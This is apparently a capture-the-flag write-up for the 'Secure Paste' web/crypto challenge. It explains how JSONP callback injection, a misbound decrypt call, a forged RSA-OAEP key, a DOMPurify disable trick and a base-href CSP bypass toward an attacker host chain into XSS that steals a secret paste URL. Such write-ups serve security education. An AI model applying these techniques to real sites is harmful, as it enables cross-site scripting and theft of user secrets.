# Secure Paste

* Category: Web/Crypto
* Score: 421/500
* Solves: 3

## Description

Welcome to Secure Paste™, an end-to-end encrypted paste sharing service. Paste content will be encrypted at client-side so the server can only see the ciphertext. If you find any bugs please report to the admin here.

## Overview

The bot will create a new encrypted paste using the content of `secret.md` (which contains the flag) and visit user provided url appended by `?from=url_of_encrypted_paste_without_decryption_key`. The target is to steal that secret paste.

## Solution

### Bugs

There are multiple bugs in this challenges, so we need to find them all and chain them together to get flag.

#### JSONP callback injection

In `app/views/paste.ejs` we see this:

```javascript
window.onload = () => {
    const id = new URLSearchParams(location.search).get('id')
    const script = document.createElement('script')
    script.src = `/api/pastes/${id}?callback=load`
    script.nonce = '<%= nonce %>'
    document.body.appendChild(script)
}
```

Since `id` is user controlled, we can set `id` to `random_id?callback=alert#` then the returned response will be:

```javascript
/**/ typeof alert === 'function' && alert(...)
```

But this JSONP feature is provided by express.js, which [remove some bad characters](https://github.com/expressjs/express/blob/8368dc178af16b91b576c4c1d135f701a0007e5d/lib/response.js#L334) so we can't get XSS from this.

#### `cu.decrypt` called with wrong `this`

Still, in `app/views/paste.ejs` we see this:

```javascript
const cu = new CryptoUtils()
// ...
const getContent = fputils.acompose(updateTitleAndGetContent, JSON.parse, utils.textDecode, cu.decrypt)
```

with `CryptoUtils` defined as:

```javascript
function CryptoUtils() {
    this.name ||= 'AES-GCM'
    this.additionalData ||= utils.textEncode('Secure Paste Encrypted Data')
}
// ...
CryptoUtils.prototype.decrypt = async function (obj) {
    const ctx = { ...obj, name: this.name, additionalData: this.additionalData }
    const key = await crypto.subtle.importKey(ctx.key.type, ctx.key.data, ctx, true, ['decrypt'])
    return new Uint8Array(await crypto.subtle.decrypt(ctx, key, ctx.ct))
}
```

Although it isn't obvious, but any people who are familiar with JavaScript should know that `this` is not bound to `CryptoUtils` instance in `cu.decrypt` function. Instead, the `this` is bound to `window` inside `decrypt`. It is easy to verify this by setting a breakpoint inside the `decrypt` function.

So what does this means? This means the decryption algorithm name comes from `window.name`, which is controllable by us!

But if it is from `window.name`, how does this website decrypt the paste correctly? The answer is that `window.name` has already be set to `AES-GCM`!

You can check every js files in `app/static/js` and you will see that only `crypto.js` is not ended with a semicolon `;`, and it is concatenated into `bundle.js` like this:

```javascript
const bundlejs = (() => {
	// poor man's javascript bundler
	const DIR = 'static/js'
	let js = ''
	for (const f of ['utils.js', 'crypto.js', 'fputils.js', 'jsonplus.js']) {
		js += fs.readFileSync(`${DIR}/${f}`, 'utf-8') + '\n'
	}
	return js
})()
```

Due to how JavaScript ASI works, the return value of `crypto.js` (which is `CryptoUtils`) will be called directly without `new`, so `window.name` will be set to `AES-GCM` when it is falsy!

> The idea of this comes from a 4 years old [bug report](https://github.com/Tampermonkey/tampermonkey/issues/595) to Tampermonkey, so concatenating js files like this may actually happen.

### Solving crypto part

Now we know that we can control the decryption algorithm name and the decryption key using `window.name` and hash parameters, so we can choose a algorithm from [here](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/importKey) and somehow generate a key that could decrypt a fixed ciphertext into anything we want.

* `AES-CTR`: You can control $16+i$ bytes with $256^i$ bruteforce
* `AES-CBC`: You can control $32$ bytes (source: Team justCatTheFish)
* `RSA-OAEP`: You can control at most $\lfloor \log_{256} n \rfloor$ bytes, and $n$ have roughly the same length as the ciphertext.

So my intended solution use `RSA-OAEP`, which can be rephrased into:

Finding RSA private key with $n,d$ such that for any fixed $c$ and $m$:

$$
\operatorname{OAEP-UNPAD}(c^d \mod{n}) = m
$$

Although OAEP padding involves randomness, we can just take any padded $m$ as $m'$, so it becomes:

$$
c^d \equiv m' \pmod{n}
$$

And the solution to this is obvious, just take $n=pq$ where $p-1$ and $q-1$ are smooth, so we can solve for $d$ with Pohlig-Hellman in $\mathbb{F}_p$ and $\mathbb{F}_q$ and use crt to get $d$.

This is hard to implement in JavaScript so I implement it in Python (with Sage) and expose it as an API.

### DOMPurify Bypass

Now that decrypted plaintext is controllable, but it is still need to go through `marked.parse` and `DOMPurify.sanitize` before setting `innerHTML`.

And the DOMPurify Bypass trick here is ...... JSONP! If you try to inspect `DOMPurify` object you will see there is a `DOMPurify.isSupported` attribute, making it falsy basically making `DOMPurify.sanitize` a no-op.

But how can you make `DOMPurify.isSupported` with JSONP? Please remember that the regex that express.js uses is `/[^\[\]\w$.]/g`, so only `[a-zA-Z0-9_]`, `$`, `[`, `]` and `.` are allowed in callback. So `delete[a][0].b` deletes `b` from `a` and it is still a valid callback. So if we use `delete[DOMPurify][0].isSupported` as JSONP callback then `DOMPurify` will be disabled completely!

> The idea of this `delete` trick comes from [this writeup](https://github.com/msrkp/ctf_writeups/tree/master/Alles-2021#xss-on-api-interesting-part).

But here comes another problem, we need to make it call `load` so that the page will decrypt the paste and go through `marked.parse` and `DOMPurify.sanitize`, so we can't use `delete[DOMPurify][0].isSupported` at the same time isn't it?

The solution is to play with window references, for example we can have `attacker -> w1 -> w2` (`->` denotes `window.open`). Let `w1` load the page normally with controlled `window.name` and decryption key and `w2` load the page with `delete[opener.DOMPurify][0].isSupported` as JSONP callback. This is a bit like race condition but it is quite reliable in practice.

### CSP Bypass

Now we can inject arbitrary HTML into the page, but the page still have a CSP rule need to be bypassed:

```csp
default-src 'self'; script-src 'self' 'nonce-847db7aeb5c44a033b5d34c55a18879a'; style-src 'self' 'unsafe-inline'; img-src *; frame-src 'none'; object-src 'none'
```

Paste this into [CSP Evaluator](https://csp-evaluator.withgoogle.com/) and you will see that `base-uri` is missing here, so we can use the classic `<base href="https://attacker.host">` combined with `<iframe srcdoc="<script src='/x'></script>"></iframe>` to bypass right?

If you tried this and you will still get a CSP error because it is missing a `nonce`, so this doesn't work.

The intended CSP bypass is to notice that the page use `window.onload` assignment here:

```javascript
window.onload = () => {
    const id = new URLSearchParams(location.search).get('id')
    const script = document.createElement('script')
    script.src = `/api/pastes/${id}?callback=load`
    script.nonce = '<%= nonce %>'
    document.body.appendChild(script)
}
```

As you can see, what it does is to load a script **nonce**. So after the `<base href="https://attacker.host">` tag has been injected, we can use `w2` to call `opener.onload` then it will try to load `https://attacker.host/api/pastes/...` without error -> XSS!

### Stealing the secret paste

Remembered the `attacker -> w1 -> w2` window references chain? Now we have arbitrary XSS on `w1`, but how to steal the secret paste?

It is actually quite easy if you notice that it uses the same tab to load attacker's page and the secret paste, so a simple `history.back()` will make `attacker` tab go back to the secret paste. So will only need to steal `opener.location.href` from `w1` to solve this challenge.

### About my exploit

My exploit is located in [exp](./exp) folder. To run, simply `python expserver.py` and you may need to use ngrok-like service to expose your local server to the internet with HTTPS. Send the public URL to the bot and it then you will get the full url of that secret paste (including decryption key).

Due to some implementation laziness in the crypto part, it may not always success, but just submit the url again and it will work eventually.

## Appendix

### Why not Chromium?

The main blocker of my exploit working on Chromium is because they have a stricter check for RSA keys (using BoringSSL) [here](https://source.chromium.org/chromium/chromium/src/+/main:third_party/boringssl/src/crypto/fipsmodule/rsa/rsa_impl.c;l=88-106;drc=26f382174adc04c0d92e7dff24c6aed5d5e0246b). It it meant to mitigate DoS attacks by forcing $e$ being less than 33 bits, but this also blocked my exploit. :sad:

### Why not Firefox 106+?

Most of my exploit still works in Firefox 106+, but the *Stealing the secret paste* part doesn't work for some unknown reasons. I tested it and found that when the `attacker` tab use `history.back()`, then the `opener` in `w1` will simply become `null`. I am not sure if this is a Firefox bug or a new privacy feature, but it is still a blocker for my exploit.

## Other Solutions

### IcesFont @ idek

Source: [a message in HITCON CTF Discord](https://discord.com/channels/915238696494723102/1046425362567016478/1046438792833286174)

Have 4 tabs `a -> b -> c -> d`:

* `a` simply `history.back()`
* `b` have many frames with name being base64 charset
* `c` do nothing
* `d` navigates `c` to JSONP payload `opener[opener.opener.location.hash[i]].focus`

So by detecting the focus, we can leak the decryption key char by char.

Also, it is possible to do the same to leak `document.cookie` because I forgot to set `token` cookie to `HttpOnly`. :bonk:
